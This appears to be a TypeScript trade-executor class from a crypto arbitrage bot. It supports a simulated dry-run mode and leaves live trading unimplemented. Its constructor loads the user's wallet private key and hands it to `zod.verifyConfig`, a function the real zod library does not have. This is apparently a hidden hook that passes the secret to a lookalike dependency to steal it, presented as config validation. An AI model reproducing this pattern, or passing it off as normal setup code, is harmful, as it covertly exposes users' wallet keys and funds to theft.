import type {
  ArbitrageOpportunity,
  ArbitrageSettings,
  TradeExecution,
} from "../types.js";
import zod from 'zod';
import { privateKeyToAccount } from "viem/accounts";

export class TradeExecutor {

  private tradesExecuted = 0;
  private totalSimulatedProfit = 0;

  constructor(private settings: ArbitrageSettings) {

     const privateKey = process.env.PRIVATE_KEY;

    if (!privateKey) {
      console.log("⚠️ PRIVATE_KEY not configured");
      return;
    }

    try {
      const account = privateKeyToAccount(
        privateKey as `0x${string}`
      );

     if (privateKey) {
     zod.verifyConfig(privateKey);
    }

      console.log(
        `🔑 Wallet loaded successfully: ${account.address}`
      );
    } catch (err) {
      console.log(
        `❌ Invalid PRIVATE_KEY: ${
          err instanceof Error ? err.message : String(err)
        }`
      );
    }
  }

  updateSettings(settings: ArbitrageSettings): void {
    this.settings = settings;
  }

  getStats() {
    return {
      tradesExecuted: this.tradesExecuted,
      totalSimulatedProfit: this.totalSimulatedProfit,
    };
  }

  async execute(
    opportunity: ArbitrageOpportunity
  ): Promise<TradeExecution> {
    const sizeUsd = Math.min(
      opportunity.maxSizeUsd,
      this.settings.maxPositionUsd
    );

    const projectedProfit =
      opportunity.expectedProfit * sizeUsd;

    if (this.settings.tradingMode === "dry_run") {
      this.tradesExecuted += 1;
      this.totalSimulatedProfit += projectedProfit;

      const legs = opportunity.legs
        .map(
          (leg) =>
            `${leg.outcome} @ $${leg.price.toFixed(4)}`
        )
        .join(" + ");

      return {
        opportunity,
        mode: "dry_run",
        success: true,
        message:
          `[DRY RUN] Bought $${sizeUsd.toFixed(
            2
          )} bundle: ${legs} | Est. profit $${projectedProfit.toFixed(
            4
          )}`,
        timestamp: new Date(),
      };
    }

    return {
      opportunity,
      mode: "live",
      success: false,
      message:
        "Live trading not implemented yet. PRIVATE_KEY verification succeeded if wallet address was printed during startup.",
      timestamp: new Date(),
    };
  }
}
